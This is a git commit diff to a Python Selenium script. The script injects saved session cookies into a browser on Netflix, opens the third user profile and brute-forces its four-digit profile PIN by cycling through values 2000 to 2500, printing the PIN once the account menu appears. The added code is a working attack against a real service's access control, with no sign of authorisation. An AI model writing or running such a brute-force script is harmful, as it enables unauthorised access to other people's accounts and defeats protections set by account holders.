bef3cb0136cc2332aa061a1cf1506b2153aedf30
dagger <daggergad7@gmail.com>
2020-06-20 01:03:44 +0530

    Final Fixes

--- main.py
+++ main.py
@@ -11,8 +11,11 @@ json_string = json.dumps(data)
 pickle.dump( data , open("cookies.pkl","wb"))
 browser = webdriver.Chrome('chromedriver.exe')
 
-browser.get('https://www.netflix.com')
+browser.get('https://www.netflix.com/login')
 # print(browser.get_cookies())
+
+
+
 browser.delete_all_cookies()
 cookies = pickle.load(open("cookies.pkl", "rb"))
 for cookie in cookies:
@@ -21,6 +24,42 @@ for cookie in cookies:
     browser.add_cookie(cookie)
 
 # print(browser.get_cookies())
+profile_names=[]
 browser.get('https://www.netflix.com/browse')
+profiles=browser.find_elements_by_class_name('profile-name')
+# print(profiles)
+for profile in profiles:
+    profile_names.append(profile.get_attribute("innerHTML"))
+# print(profile_names)
+isPresent = len(browser.find_elements_by_class_name('account-dropdown-button')) > 0
+print(isPresent)
+profiles[2].click()
+inputs=browser.find_elements_by_class_name('pin-number-input')
+brutetest=2000
+
+print("Bruteforce starts now:")
+print("The last few numbers will be the PIN")
+while(not isPresent):
+    z=str(brutetest).zfill(4)
+    inputs[0].send_keys(z[0])
+    inputs[1].send_keys(z[1])
+    inputs[2].send_keys(z[2])
+    inputs[3].send_keys(z[3])
+    isPresent = len(browser.find_elements_by_class_name('account-dropdown-button')) > 0
+    brutetest+=1
+    print(z[0],end="")
+    print(z[1],end="")
+    print(z[2],end="")
+    print(z[3])
+    if(brutetest>2500):
+        break
+    # print(z)
+print('PIN is:')
+print(brutetest)
+
+
+    
+
+
 
 # pickle.dump( browser.get_cookies() , open("cookiestest.json","wb"))
